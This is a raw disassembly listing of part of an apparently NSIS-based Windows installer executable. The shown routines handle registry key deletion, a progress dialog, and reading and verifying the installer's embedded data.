  402b8d:	1a 40 00             	sbb    0x0(%eax),%al
  402b90:	02 1b                	add    (%ebx),%bl
  402b92:	40                   	inc    %eax
  402b93:	00 0b                	add    %cl,(%ebx)
  402b95:	1b 40 00             	sbb    0x0(%eax),%eax
  402b98:	18 1b                	sbb    %bl,(%ebx)
  402b9a:	40                   	inc    %eax
  402b9b:	00 28                	add    %ch,(%eax)
  402b9d:	1b 40 00             	sbb    0x0(%eax),%eax
  402ba0:	46                   	inc    %esi
  402ba1:	1b 40 00             	sbb    0x0(%eax),%eax
  402ba4:	4d                   	dec    %ebp
  402ba5:	1b 40 00             	sbb    0x0(%eax),%eax
  402ba8:	54                   	push   %esp
  402ba9:	1b 40 00             	sbb    0x0(%eax),%eax
  402bac:	8b 44 24 04          	mov    0x4(%esp),%eax
  402bb0:	8b 0d 5c b8 40 00    	mov    0x40b85c,%ecx
  402bb6:	56                   	push   %esi
  402bb7:	ff 34 81             	push   (%ecx,%eax,4)
  402bba:	6a 00                	push   $0x0
  402bbc:	e8 fa 36 00 00       	call   0x4062bb
  402bc1:	8b f0                	mov    %eax,%esi
  402bc3:	56                   	push   %esi
  402bc4:	e8 d6 35 00 00       	call   0x40619f
  402bc9:	0f be 16             	movsbl (%esi),%edx
  402bcc:	5e                   	pop    %esi
  402bcd:	c3                   	ret
  402bce:	56                   	push   %esi
  402bcf:	8b 74 24 08          	mov    0x8(%esp),%esi
  402bd3:	85 f6                	test   %esi,%esi
  402bd5:	57                   	push   %edi
  402bd6:	8b c6                	mov    %esi,%eax
  402bd8:	7d 02                	jge    0x402bdc
  402bda:	f7 d8                	neg    %eax
  402bdc:	8b 15 5c b8 40 00    	mov    0x40b85c,%edx
  402be2:	8b c8                	mov    %eax,%ecx
  402be4:	83 e1 0f             	and    $0xf,%ecx
  402be7:	c1 f8 04             	sar    $0x4,%eax
  402bea:	ff 34 8a             	push   (%edx,%ecx,4)
  402bed:	c1 e0 0a             	shl    $0xa,%eax
  402bf0:	05 20 a4 40 00       	add    $0x40a420,%eax
  402bf5:	50                   	push   %eax
  402bf6:	e8 c0 36 00 00       	call   0x4062bb
  402bfb:	85 f6                	test   %esi,%esi
  402bfd:	8b f8                	mov    %eax,%edi
  402bff:	7d 06                	jge    0x402c07
  402c01:	57                   	push   %edi
  402c02:	e8 fc 38 00 00       	call   0x406503
  402c07:	8b c7                	mov    %edi,%eax
  402c09:	5f                   	pop    %edi
  402c0a:	5e                   	pop    %esi
  402c0b:	c2 04 00             	ret    $0x4
  402c0e:	55                   	push   %ebp
  402c0f:	8b ec                	mov    %esp,%ebp
  402c11:	8d 45 08             	lea    0x8(%ebp),%eax
  402c14:	50                   	push   %eax
  402c15:	8b 45 08             	mov    0x8(%ebp),%eax
  402c18:	0d 20 00 10 00       	or     $0x100020,%eax
  402c1d:	50                   	push   %eax
  402c1e:	6a 22                	push   $0x22
  402c20:	e8 a9 ff ff ff       	call   0x402bce
  402c25:	50                   	push   %eax
  402c26:	a1 5c b8 40 00       	mov    0x40b85c,%eax
  402c2b:	ff 70 04             	push   0x4(%eax)
  402c2e:	e8 13 00 00 00       	call   0x402c46
  402c33:	50                   	push   %eax
  402c34:	e8 75 34 00 00       	call   0x4060ae
  402c39:	f7 d8                	neg    %eax
  402c3b:	1b c0                	sbb    %eax,%eax
  402c3d:	f7 d0                	not    %eax
  402c3f:	23 45 08             	and    0x8(%ebp),%eax
  402c42:	5d                   	pop    %ebp
  402c43:	c2 04 00             	ret    $0x4
  402c46:	8b 44 24 04          	mov    0x4(%esp),%eax
  402c4a:	85 c0                	test   %eax,%eax
  402c4c:	7c 0d                	jl     0x402c5b
  402c4e:	8b 0d e4 47 42 00    	mov    0x4247e4,%ecx
  402c54:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402c5b:	c2 04 00             	ret    $0x4
  402c5e:	55                   	push   %ebp
  402c5f:	8b ec                	mov    %esp,%ebp
  402c61:	8d 45 10             	lea    0x10(%ebp),%eax
  402c64:	50                   	push   %eax
  402c65:	8b 45 10             	mov    0x10(%ebp),%eax
  402c68:	0d 20 00 10 00       	or     $0x100020,%eax
  402c6d:	50                   	push   %eax
  402c6e:	ff 75 0c             	push   0xc(%ebp)
  402c71:	ff 75 08             	push   0x8(%ebp)
  402c74:	e8 cd ff ff ff       	call   0x402c46
  402c79:	50                   	push   %eax
  402c7a:	e8 5d 34 00 00       	call   0x4060dc
  402c7f:	f7 d8                	neg    %eax
  402c81:	1b c0                	sbb    %eax,%eax
  402c83:	f7 d0                	not    %eax
  402c85:	23 45 10             	and    0x10(%ebp),%eax
  402c88:	5d                   	pop    %ebp
  402c89:	c2 0c 00             	ret    $0xc
  402c8c:	55                   	push   %ebp
  402c8d:	8b ec                	mov    %esp,%ebp
  402c8f:	56                   	push   %esi
  402c90:	8b 75 0c             	mov    0xc(%ebp),%esi
  402c93:	80 3e 00             	cmpb   $0x0,(%esi)
  402c96:	75 07                	jne    0x402c9f
  402c98:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402c9d:	eb 2c                	jmp    0x402ccb
  402c9f:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402ca6:	8d 45 10             	lea    0x10(%ebp),%eax
  402ca9:	50                   	push   %eax
  402caa:	ff 75 08             	push   0x8(%ebp)
  402cad:	e8 94 ff ff ff       	call   0x402c46
  402cb2:	50                   	push   %eax
  402cb3:	e8 7b 33 00 00       	call   0x406033
  402cb8:	85 c0                	test   %eax,%eax
  402cba:	74 0c                	je     0x402cc8
  402cbc:	ff 75 10             	push   0x10(%ebp)
  402cbf:	56                   	push   %esi
  402cc0:	50                   	push   %eax
  402cc1:	e8 0a 00 00 00       	call   0x402cd0
  402cc6:	eb 03                	jmp    0x402ccb
  402cc8:	6a 06                	push   $0x6
  402cca:	58                   	pop    %eax
  402ccb:	5e                   	pop    %esi
  402ccc:	5d                   	pop    %ebp
  402ccd:	c2 0c 00             	ret    $0xc
  402cd0:	55                   	push   %ebp
  402cd1:	8b ec                	mov    %esp,%ebp
  402cd3:	81 ec 10 01 00 00    	sub    $0x110,%esp
  402cd9:	53                   	push   %ebx
  402cda:	56                   	push   %esi
  402cdb:	8b 75 10             	mov    0x10(%ebp),%esi
  402cde:	57                   	push   %edi
  402cdf:	8b fe                	mov    %esi,%edi
  402ce1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402ce4:	81 e6 00 03 00 00    	and    $0x300,%esi
  402cea:	50                   	push   %eax
  402ceb:	8b c6                	mov    %esi,%eax
  402ced:	83 e7 01             	and    $0x1,%edi
  402cf0:	0c 09                	or     $0x9,%al
  402cf2:	50                   	push   %eax
  402cf3:	ff 75 0c             	push   0xc(%ebp)
  402cf6:	ff 75 08             	push   0x8(%ebp)
  402cf9:	e8 b0 33 00 00       	call   0x4060ae
  402cfe:	33 db                	xor    %ebx,%ebx
  402d00:	3b c3                	cmp    %ebx,%eax
  402d02:	0f 85 ab 00 00 00    	jne    0x402db3
  402d08:	f6 45 10 02          	testb  $0x2,0x10(%ebp)
  402d0c:	74 23                	je     0x402d31
  402d0e:	53                   	push   %ebx
  402d0f:	53                   	push   %ebx
  402d10:	53                   	push   %ebx
  402d11:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402d14:	53                   	push   %ebx
  402d15:	50                   	push   %eax
  402d16:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  402d1c:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402d1f:	50                   	push   %eax
  402d20:	53                   	push   %ebx
  402d21:	ff 75 fc             	push   -0x4(%ebp)
  402d24:	ff 15 30 80 40 00    	call   *0x408030
  402d2a:	3d 03 01 00 00       	cmp    $0x103,%eax
  402d2f:	75 67                	jne    0x402d98
  402d31:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  402d37:	68 05 01 00 00       	push   $0x105
  402d3c:	50                   	push   %eax
  402d3d:	53                   	push   %ebx
  402d3e:	8b 1d 04 80 40 00    	mov    0x408004,%ebx
  402d44:	eb 27                	jmp    0x402d6d
  402d46:	85 ff                	test   %edi,%edi
  402d48:	75 4e                	jne    0x402d98
  402d4a:	ff 75 10             	push   0x10(%ebp)
  402d4d:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  402d53:	50                   	push   %eax
  402d54:	ff 75 fc             	push   -0x4(%ebp)
  402d57:	e8 74 ff ff ff       	call   0x402cd0
  402d5c:	85 c0                	test   %eax,%eax
  402d5e:	75 16                	jne    0x402d76
  402d60:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  402d66:	68 05 01 00 00       	push   $0x105
  402d6b:	50                   	push   %eax
  402d6c:	57                   	push   %edi
  402d6d:	ff 75 fc             	push   -0x4(%ebp)
  402d70:	ff d3                	call   *%ebx
  402d72:	85 c0                	test   %eax,%eax
  402d74:	74 d0                	je     0x402d46
  402d76:	ff 75 fc             	push   -0x4(%ebp)
  402d79:	ff 15 10 80 40 00    	call   *0x408010
  402d7f:	6a 03                	push   $0x3
  402d81:	e8 ab 38 00 00       	call   0x406631
  402d86:	85 c0                	test   %eax,%eax
  402d88:	75 1e                	jne    0x402da8
  402d8a:	ff 75 0c             	push   0xc(%ebp)
  402d8d:	ff 75 08             	push   0x8(%ebp)
  402d90:	ff 15 18 80 40 00    	call   *0x408018
  402d96:	eb 1b                	jmp    0x402db3
  402d98:	ff 75 fc             	push   -0x4(%ebp)
  402d9b:	ff 15 10 80 40 00    	call   *0x408010
  402da1:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402da6:	eb 0b                	jmp    0x402db3
  402da8:	6a 00                	push   $0x0
  402daa:	56                   	push   %esi
  402dab:	ff 75 0c             	push   0xc(%ebp)
  402dae:	ff 75 08             	push   0x8(%ebp)
  402db1:	ff d0                	call   *%eax
  402db3:	5f                   	pop    %edi
  402db4:	5e                   	pop    %esi
  402db5:	5b                   	pop    %ebx
  402db6:	c9                   	leave
  402db7:	c2 0c 00             	ret    $0xc
  402dba:	55                   	push   %ebp
  402dbb:	8b ec                	mov    %esp,%ebp
  402dbd:	83 ec 40             	sub    $0x40,%esp
  402dc0:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402dc7:	75 19                	jne    0x402de2
  402dc9:	6a 00                	push   $0x0
  402dcb:	68 fa 00 00 00       	push   $0xfa
  402dd0:	6a 01                	push   $0x1
  402dd2:	ff 75 08             	push   0x8(%ebp)
  402dd5:	ff 15 14 82 40 00    	call   *0x408214
  402ddb:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402de2:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402de9:	75 45                	jne    0x402e30
  402deb:	e8 46 00 00 00       	call   0x402e36
  402df0:	83 3d 54 47 42 00 00 	cmpl   $0x0,0x424754
  402df7:	b9 3c a0 40 00       	mov    $0x40a03c,%ecx
  402dfc:	75 05                	jne    0x402e03
  402dfe:	b9 20 a0 40 00       	mov    $0x40a020,%ecx
  402e03:	50                   	push   %eax
  402e04:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402e07:	51                   	push   %ecx
  402e08:	50                   	push   %eax
  402e09:	ff 15 34 82 40 00    	call   *0x408234
  402e0f:	83 c4 0c             	add    $0xc,%esp
  402e12:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402e15:	50                   	push   %eax
  402e16:	ff 75 08             	push   0x8(%ebp)
  402e19:	ff 15 24 82 40 00    	call   *0x408224
  402e1f:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402e22:	50                   	push   %eax
  402e23:	68 06 04 00 00       	push   $0x406
  402e28:	ff 75 08             	push   0x8(%ebp)
  402e2b:	e8 f2 2a 00 00       	call   0x405922
  402e30:	33 c0                	xor    %eax,%eax
  402e32:	c9                   	leave
  402e33:	c2 10 00             	ret    $0x10
  402e36:	8b 0d f8 f8 41 00    	mov    0x41f8f8,%ecx
  402e3c:	a1 08 f9 41 00       	mov    0x41f908,%eax
  402e41:	3b c8                	cmp    %eax,%ecx
  402e43:	72 02                	jb     0x402e47
  402e45:	8b c8                	mov    %eax,%ecx
  402e47:	50                   	push   %eax
  402e48:	6a 64                	push   $0x64
  402e4a:	51                   	push   %ecx
  402e4b:	ff 15 64 81 40 00    	call   *0x408164
  402e51:	c3                   	ret
  402e52:	55                   	push   %ebp
  402e53:	8b ec                	mov    %esp,%ebp
  402e55:	83 ec 40             	sub    $0x40,%esp
  402e58:	56                   	push   %esi
  402e59:	33 f6                	xor    %esi,%esi
  402e5b:	39 75 08             	cmp    %esi,0x8(%ebp)
  402e5e:	74 18                	je     0x402e78
  402e60:	a1 04 f9 41 00       	mov    0x41f904,%eax
  402e65:	3b c6                	cmp    %esi,%eax
  402e67:	74 07                	je     0x402e70
  402e69:	50                   	push   %eax
  402e6a:	ff 15 18 82 40 00    	call   *0x408218
  402e70:	89 35 04 f9 41 00    	mov    %esi,0x41f904
  402e76:	eb 76                	jmp    0x402eee
  402e78:	39 35 04 f9 41 00    	cmp    %esi,0x41f904
  402e7e:	74 08                	je     0x402e88
  402e80:	56                   	push   %esi
  402e81:	e8 e7 37 00 00       	call   0x40666d
  402e86:	eb 66                	jmp    0x402eee
  402e88:	ff 15 e8 80 40 00    	call   *0x4080e8
  402e8e:	3b 05 50 47 42 00    	cmp    0x424750,%eax
  402e94:	76 58                	jbe    0x402eee
  402e96:	39 35 48 47 42 00    	cmp    %esi,0x424748
  402e9c:	74 2d                	je     0x402ecb
  402e9e:	f6 05 14 48 42 00 01 	testb  $0x1,0x424814
  402ea5:	74 47                	je     0x402eee
  402ea7:	e8 8a ff ff ff       	call   0x402e36
  402eac:	50                   	push   %eax
  402ead:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402eb0:	68 54 a0 40 00       	push   $0x40a054
  402eb5:	50                   	push   %eax
  402eb6:	ff 15 34 82 40 00    	call   *0x408234
  402ebc:	83 c4 0c             	add    $0xc,%esp
  402ebf:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402ec2:	50                   	push   %eax
  402ec3:	56                   	push   %esi
  402ec4:	e8 86 24 00 00       	call   0x40534f
  402ec9:	eb 23                	jmp    0x402eee
  402ecb:	56                   	push   %esi
  402ecc:	68 ba 2d 40 00       	push   $0x402dba
  402ed1:	56                   	push   %esi
  402ed2:	6a 6f                	push   $0x6f
  402ed4:	ff 35 40 47 42 00    	push   0x424740
  402eda:	ff 15 1c 82 40 00    	call   *0x40821c
  402ee0:	6a 05                	push   $0x5
  402ee2:	50                   	push   %eax
  402ee3:	a3 04 f9 41 00       	mov    %eax,0x41f904
  402ee8:	ff 15 30 82 40 00    	call   *0x408230
  402eee:	5e                   	pop    %esi
  402eef:	c9                   	leave
  402ef0:	c3                   	ret
  402ef1:	55                   	push   %ebp
  402ef2:	8b ec                	mov    %esp,%ebp
  402ef4:	81 ec 28 01 00 00    	sub    $0x128,%esp
  402efa:	53                   	push   %ebx
  402efb:	56                   	push   %esi
  402efc:	33 db                	xor    %ebx,%ebx
  402efe:	57                   	push   %edi
  402eff:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402f02:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402f05:	ff 15 e8 80 40 00    	call   *0x4080e8
  402f0b:	be 00 bc 42 00       	mov    $0x42bc00,%esi
  402f10:	68 00 04 00 00       	push   $0x400
  402f15:	05 e8 03 00 00       	add    $0x3e8,%eax
  402f1a:	56                   	push   %esi
  402f1b:	53                   	push   %ebx
  402f1c:	a3 50 47 42 00       	mov    %eax,0x424750
  402f21:	ff 15 dc 80 40 00    	call   *0x4080dc
  402f27:	6a 03                	push   $0x3
  402f29:	68 00 00 00 80       	push   $0x80000000
  402f2e:	56                   	push   %esi
  402f2f:	e8 8d 2e 00 00       	call   0x405dc1
  402f34:	8b f8                	mov    %eax,%edi
  402f36:	83 ff ff             	cmp    $0xffffffff,%edi
  402f39:	89 3d 18 a0 40 00    	mov    %edi,0x40a018
  402f3f:	75 0a                	jne    0x402f4b
  402f41:	b8 74 a1 40 00       	mov    $0x40a174,%eax
  402f46:	e9 40 02 00 00       	jmp    0x40318b
  402f4b:	56                   	push   %esi
  402f4c:	be 00 ac 42 00       	mov    $0x42ac00,%esi
  402f51:	56                   	push   %esi
  402f52:	e8 d1 32 00 00       	call   0x406228
  402f57:	56                   	push   %esi
  402f58:	e8 aa 2c 00 00       	call   0x405c07
  402f5d:	50                   	push   %eax
  402f5e:	68 00 c0 42 00       	push   $0x42c000
  402f63:	e8 c0 32 00 00       	call   0x406228
  402f68:	53                   	push   %ebx
  402f69:	57                   	push   %edi
  402f6a:	ff 15 e0 80 40 00    	call   *0x4080e0
  402f70:	3b c3                	cmp    %ebx,%eax
  402f72:	a3 08 f9 41 00       	mov    %eax,0x41f908
  402f77:	8b f0                	mov    %eax,%esi
  402f79:	0f 86 e5 00 00 00    	jbe    0x403064
  402f7f:	bb f8 78 41 00       	mov    $0x4178f8,%ebx
  402f84:	a1 58 47 42 00       	mov    0x424758,%eax
  402f89:	8b fe                	mov    %esi,%edi
  402f8b:	f7 d8                	neg    %eax
  402f8d:	1b c0                	sbb    %eax,%eax
  402f8f:	25 00 7e 00 00       	and    $0x7e00,%eax
  402f94:	05 00 02 00 00       	add    $0x200,%eax
  402f99:	3b f0                	cmp    %eax,%esi
  402f9b:	72 02                	jb     0x402f9f
  402f9d:	8b f8                	mov    %eax,%edi
  402f9f:	57                   	push   %edi
  402fa0:	53                   	push   %ebx
  402fa1:	e8 5d 04 00 00       	call   0x403403
  402fa6:	85 c0                	test   %eax,%eax
  402fa8:	0f 84 51 01 00 00    	je     0x4030ff
  402fae:	83 3d 58 47 42 00 00 	cmpl   $0x0,0x424758
  402fb5:	75 7a                	jne    0x403031
  402fb7:	6a 1c                	push   $0x1c
  402fb9:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402fbc:	53                   	push   %ebx
  402fbd:	50                   	push   %eax
  402fbe:	e8 b9 2d 00 00       	call   0x405d7c
  402fc3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402fc6:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  402fcb:	75 72                	jne    0x40303f
  402fcd:	81 7d e0 ef be ad de 	cmpl   $0xdeadbeef,-0x20(%ebp)
  402fd4:	75 69                	jne    0x40303f
  402fd6:	81 7d ec 49 6e 73 74 	cmpl   $0x74736e49,-0x14(%ebp)
  402fdd:	75 60                	jne    0x40303f
  402fdf:	81 7d e8 73 6f 66 74 	cmpl   $0x74666f73,-0x18(%ebp)
  402fe6:	75 57                	jne    0x40303f
  402fe8:	81 7d e4 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x1c(%ebp)
  402fef:	75 4e                	jne    0x40303f
  402ff1:	09 45 08             	or     %eax,0x8(%ebp)
  402ff4:	8b 45 08             	mov    0x8(%ebp),%eax
  402ff7:	8b 0d f8 f8 41 00    	mov    0x41f8f8,%ecx
  402ffd:	83 e0 02             	and    $0x2,%eax
  403000:	09 05 00 48 42 00    	or     %eax,0x424800
  403006:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403009:	3b c6                	cmp    %esi,%eax
  40300b:	89 0d 58 47 42 00    	mov    %ecx,0x424758
  403011:	0f 87 2c 01 00 00    	ja     0x403143
  403017:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  40301b:	75 06                	jne    0x403023
  40301d:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  403021:	75 3f                	jne    0x403062
  403023:	ff 45 f8             	incl   -0x8(%ebp)
  403026:	8d 70 fc             	lea    -0x4(%eax),%esi
  403029:	3b fe                	cmp    %esi,%edi
  40302b:	76 12                	jbe    0x40303f
  40302d:	8b fe                	mov    %esi,%edi
  40302f:	eb 0e                	jmp    0x40303f
  403031:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  403035:	75 08                	jne    0x40303f
  403037:	6a 00                	push   $0x0
  403039:	e8 14 fe ff ff       	call   0x402e52
  40303e:	59                   	pop    %ecx
  40303f:	3b 35 08 f9 41 00    	cmp    0x41f908,%esi
  403045:	73 0d                	jae    0x403054
  403047:	57                   	push   %edi
  403048:	53                   	push   %ebx
  403049:	ff 75 fc             	push   -0x4(%ebp)
  40304c:	e8 97 36 00 00       	call   0x4066e8
  403051:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403054:	01 3d f8 f8 41 00    	add    %edi,0x41f8f8
  40305a:	2b f7                	sub    %edi,%esi
  40305c:	0f 85 22 ff ff ff    	jne    0x402f84
  403062:	33 db                	xor    %ebx,%ebx
  403064:	6a 01                	push   $0x1
  403066:	e8 e7 fd ff ff       	call   0x402e52
  40306b:	39 1d 58 47 42 00    	cmp    %ebx,0x424758
  403071:	59                   	pop    %ecx
  403072:	0f 84 cb 00 00 00    	je     0x403143
  403078:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40307b:	74 2a                	je     0x4030a7
  40307d:	ff 35 f8 f8 41 00    	push   0x41f8f8
  403083:	e8 91 03 00 00       	call   0x403419
  403088:	8d 45 08             	lea    0x8(%ebp),%eax
  40308b:	6a 04                	push   $0x4
  40308d:	50                   	push   %eax
  40308e:	e8 70 03 00 00       	call   0x403403
  403093:	85 c0                	test   %eax,%eax
  403095:	0f 84 a8 00 00 00    	je     0x403143
  40309b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40309e:	3b 45 08             	cmp    0x8(%ebp),%eax
  4030a1:	0f 85 9c 00 00 00    	jne    0x403143
  4030a7:	ff 75 f0             	push   -0x10(%ebp)
  4030aa:	6a 40                	push   $0x40
  4030ac:	ff 15 28 81 40 00    	call   *0x408128
  4030b2:	b9 70 b8 40 00       	mov    $0x40b870,%ecx
  4030b7:	8b f0                	mov    %eax,%esi
  4030b9:	e8 98 36 00 00       	call   0x406756
  4030be:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  4030c4:	68 00 b4 42 00       	push   $0x42b400
  4030c9:	50                   	push   %eax
  4030ca:	e8 21 2d 00 00       	call   0x405df0
  4030cf:	53                   	push   %ebx
  4030d0:	68 00 01 00 04       	push   $0x4000100
  4030d5:	6a 02                	push   $0x2
  4030d7:	53                   	push   %ebx
  4030d8:	53                   	push   %ebx
  4030d9:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  4030df:	68 00 00 00 c0       	push   $0xc0000000
  4030e4:	50                   	push   %eax
  4030e5:	ff 15 f0 80 40 00    	call   *0x4080f0
  4030eb:	83 f8 ff             	cmp    $0xffffffff,%eax
  4030ee:	a3 1c a0 40 00       	mov    %eax,0x40a01c
  4030f3:	75 14                	jne    0x403109
  4030f5:	b8 30 a1 40 00       	mov    $0x40a130,%eax
  4030fa:	e9 8c 00 00 00       	jmp    0x40318b
  4030ff:	6a 01                	push   $0x1
  403101:	e8 4c fd ff ff       	call   0x402e52
  403106:	59                   	pop    %ecx
  403107:	eb 3a                	jmp    0x403143
  403109:	a1 58 47 42 00       	mov    0x424758,%eax
  40310e:	83 c0 1c             	add    $0x1c,%eax
  403111:	50                   	push   %eax
  403112:	e8 02 03 00 00       	call   0x403419
  403117:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40311a:	ff 75 f0             	push   -0x10(%ebp)
  40311d:	f7 d1                	not    %ecx
  40311f:	83 e1 04             	and    $0x4,%ecx
  403122:	a3 0c f9 41 00       	mov    %eax,0x41f90c
  403127:	2b c1                	sub    %ecx,%eax
  403129:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40312c:	56                   	push   %esi
  40312d:	53                   	push   %ebx
  40312e:	8d 44 08 e4          	lea    -0x1c(%eax,%ecx,1),%eax
  403132:	6a ff                	push   $0xffffffff
  403134:	a3 00 f9 41 00       	mov    %eax,0x41f900
  403139:	e8 54 00 00 00       	call   0x403192
  40313e:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  403141:	74 07                	je     0x40314a
  403143:	b8 60 a0 40 00       	mov    $0x40a060,%eax
  403148:	eb 41                	jmp    0x40318b
  40314a:	f6 45 dc 01          	testb  $0x1,-0x24(%ebp)
  40314e:	89 35 54 47 42 00    	mov    %esi,0x424754
  403154:	8b 06                	mov    (%esi),%eax
  403156:	a3 5c 47 42 00       	mov    %eax,0x42475c
  40315b:	74 06                	je     0x403163
  40315d:	ff 05 60 47 42 00    	incl   0x424760
  403163:	6a 08                	push   $0x8
  403165:	8d 46 44             	lea    0x44(%esi),%eax
  403168:	59                   	pop    %ecx
  403169:	83 e8 08             	sub    $0x8,%eax
  40316c:	01 30                	add    %esi,(%eax)
  40316e:	49                   	dec    %ecx
  40316f:	75 f8                	jne    0x403169
  403171:	a1 fc f8 41 00       	mov    0x41f8fc,%eax
  403176:	6a 40                	push   $0x40
  403178:	89 46 3c             	mov    %eax,0x3c(%esi)
  40317b:	83 c6 04             	add    $0x4,%esi
  40317e:	56                   	push   %esi
  40317f:	68 80 47 42 00       	push   $0x424780
  403184:	e8 f3 2b 00 00       	call   0x405d7c
  403189:	33 c0                	xor    %eax,%eax
  40318b:	5f                   	pop    %edi
  40318c:	5e                   	pop    %esi
  40318d:	5b                   	pop    %ebx
  40318e:	c9                   	leave
  40318f:	c2 04 00             	ret    $0x4
  403192:	55                   	push   %ebp
  403193:	8b ec                	mov    %esp,%ebp
  403195:	51                   	push   %ecx
  403196:	8b 45 08             	mov    0x8(%ebp),%eax
  403199:	53                   	push   %ebx
  40319a:	56                   	push   %esi
  40319b:	33 f6                	xor    %esi,%esi
  40319d:	3b c6                	cmp    %esi,%eax
  40319f:	7c 1c                	jl     0x4031bd
  4031a1:	8b 0d b8 47 42 00    	mov    0x4247b8,%ecx
  4031a7:	56                   	push   %esi
  4031a8:	03 c1                	add    %ecx,%eax
  4031aa:	56                   	push   %esi
  4031ab:	50                   	push   %eax
  4031ac:	a3 fc f8 41 00       	mov    %eax,0x41f8fc
  4031b1:	ff 35 1c a0 40 00    	push   0x40a01c
  4031b7:	ff 15 50 81 40 00    	call   *0x408150
  4031bd:	6a 04                	push   $0x4
  4031bf:	e8 d6 00 00 00       	call   0x40329a
  4031c4:	3b c6                	cmp    %esi,%eax
  4031c6:	0f 8c c8 00 00 00    	jl     0x403294
  4031cc:	8d 45 08             	lea    0x8(%ebp),%eax
  4031cf:	6a 04                	push   $0x4
  4031d1:	50                   	push   %eax
  4031d2:	ff 35 1c a0 40 00    	push   0x40a01c
  4031d8:	e8 5c 2c 00 00       	call   0x405e39
  4031dd:	85 c0                	test   %eax,%eax
  4031df:	0f 84 9f 00 00 00    	je     0x403284
  4031e5:	ff 75 08             	push   0x8(%ebp)
  4031e8:	83 05 fc f8 41 00 04 	addl   $0x4,0x41f8fc
  4031ef:	e8 a6 00 00 00       	call   0x40329a
  4031f4:	8b d8                	mov    %eax,%ebx
  4031f6:	3b de                	cmp    %esi,%ebx
  4031f8:	0f 8c 94 00 00 00    	jl     0x403292
  4031fe:	39 75 10             	cmp    %esi,0x10(%ebp)
  403201:	75 5d                	jne    0x403260
  403203:	39 75 08             	cmp    %esi,0x8(%ebp)
  403206:	0f 8e 86 00 00 00    	jle    0x403292
  40320c:	be f8 38 41 00       	mov    $0x4138f8,%esi
  403211:	81 7d 08 00 40 00 00 	cmpl   $0x4000,0x8(%ebp)
  403218:	8b 45 08             	mov    0x8(%ebp),%eax
  40321b:	7c 05                	jl     0x403222
  40321d:	b8 00 40 00 00       	mov    $0x4000,%eax
  403222:	50                   	push   %eax
  403223:	56                   	push   %esi
  403224:	ff 35 1c a0 40 00    	push   0x40a01c
  40322a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40322d:	e8 07 2c 00 00       	call   0x405e39
  403232:	85 c0                	test   %eax,%eax
  403234:	74 4e                	je     0x403284
  403236:	ff 75 fc             	push   -0x4(%ebp)
  403239:	56                   	push   %esi
  40323a:	ff 75 0c             	push   0xc(%ebp)
  40323d:	e8 26 2c 00 00       	call   0x405e68
  403242:	85 c0                	test   %eax,%eax
  403244:	74 16                	je     0x40325c
  403246:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403249:	29 45 08             	sub    %eax,0x8(%ebp)
  40324c:	01 05 fc f8 41 00    	add    %eax,0x41f8fc
  403252:	03 d8                	add    %eax,%ebx
  403254:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403258:	7f b7                	jg     0x403211
  40325a:	eb 36                	jmp    0x403292
  40325c:	6a fe                	push   $0xfffffffe
  40325e:	eb 26                	jmp    0x403286
  403260:	8b 45 08             	mov    0x8(%ebp),%eax
  403263:	3b 45 14             	cmp    0x14(%ebp),%eax
  403266:	7c 03                	jl     0x40326b
  403268:	8b 45 14             	mov    0x14(%ebp),%eax
  40326b:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40326e:	56                   	push   %esi
  40326f:	51                   	push   %ecx
  403270:	50                   	push   %eax
  403271:	ff 75 10             	push   0x10(%ebp)
  403274:	ff 35 1c a0 40 00    	push   0x40a01c
  40327a:	ff 15 e4 80 40 00    	call   *0x4080e4
  403280:	85 c0                	test   %eax,%eax
  403282:	75 05                	jne    0x403289
  403284:	6a fd                	push   $0xfffffffd
  403286:	58                   	pop    %eax
  403287:	eb 0b                	jmp    0x403294
  403289:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40328c:	01 1d fc f8 41 00    	add    %ebx,0x41f8fc
  403292:	8b c3                	mov    %ebx,%eax
  403294:	5e                   	pop    %esi
  403295:	5b                   	pop    %ebx
  403296:	c9                   	leave
  403297:	c2 10 00             	ret    $0x10
  40329a:	53                   	push   %ebx
  40329b:	55                   	push   %ebp
  40329c:	56                   	push   %esi
  40329d:	8b 35 fc f8 41 00    	mov    0x41f8fc,%esi
